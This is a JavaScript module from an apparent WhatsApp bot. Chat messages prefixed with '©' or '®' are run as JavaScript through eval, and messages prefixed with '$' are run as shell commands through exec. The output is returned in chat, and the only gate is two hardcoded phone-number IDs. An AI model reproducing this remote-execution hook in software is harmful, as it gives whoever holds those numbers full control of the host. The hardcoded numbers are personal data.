// dev.js
 const sophia = require('../lib/sophia');
  const { 
    decodeJid,
    isBot,
    isBotQuoted,
  isAdmin, 
    parseJid,
    parsedJid,
    isInGroup,
    delay,
    isValidTikTokURL , 
    base64ToBuffer,
    bufferToBase64,
    checkURL
  } = require('./functions')
  const react = require('react')
  const { exec } = require('child_process')
  const os = require('os');
  const fs = require('fs')
  const path = require('path')
  const allowedUsers = ['2348073765008@s.whatsapp.net', '2347017895743@s.whatsapp.net'];
  const downloadMedia = require('./downloadMedia')
async function devFunctions(text,message,sock){
if (text.startsWith('©')) {
    const sender = message.key.remoteJid;
    const participant = message.key.participant;
    if (!allowedUsers.includes(sender) && !allowedUsers.includes(participant) && !message.key.fromMe) {
        return;
    }
    if(isBot(message)) return;
     try {
        // Wrap the eval call in an async function
        const result = await eval(`(async () => { ${text.slice(1)} })()`);
        const output = typeof result === 'object' ? JSON.stringify(result, null, 2) : result;
        await sock.sendMessage(sender, { text: `©Executed: ${output}` }, { quoted: message });
    } catch (error) {
        await sock.sendMessage(sender, { text: `©Error: ${error.message}` }, { quoted: message });
    }
}

if (text.startsWith('®')) {
    const sender = message.key.remoteJid;
    const participant = message.key.participant;

    if (!allowedUsers.includes(sender) && !allowedUsers.includes(participant) && !message.key.fromMe) {
        return;
    }
    if(isBot(message)) return;
     try {
        // Wrap the eval call in an async function
        const result = await eval(text.slice(1));
        const output = typeof result === 'object' ? JSON.stringify(result, null, 2) : result;
        await sock.sendMessage(sender, { text: `®Executed: ${output}` }, { quoted: message });
    } catch (error) {
        await sock.sendMessage(sender, { text: `®Error: ${error.message}` }, { quoted: message });
    }
}


    // Handle shell commands (starts with $)
    if (text.startsWith('$')) {
        const sender = message.key.remoteJid;

        if (!allowedUsers.includes(sender) && !message.key.fromMe) {
            return;
        }

      if(isBot(message)) return;
        const command = text.slice(1).trim();

        if (!command) {
            return;
        }

        try {
            exec(command, (error, stdout, stderr) => {
                if (error) {
                    console.error(`Exec error: ${error.message}`);
                    sock.sendMessage(sender, { text: `Error executing command: ${error.message}` }, { quoted: message });
                    return;
                }

                if (stderr) {
                    console.error(`Stderr: ${stderr}`);
                    sock.sendMessage(sender, { text: `Error output:\n${stderr}` }, { quoted: message });
                    return;
                }

                sock.sendMessage(sender, { text: `Output:\n${stdout}` }, { quoted: message });
            });
        } catch (err) {
            console.error('Error executing command:', err);
            sock.sendMessage(sender, { text: 'Failed to execute command.' }, { quoted: message });
        }
        return;
    }
}
module.exports = devFunctions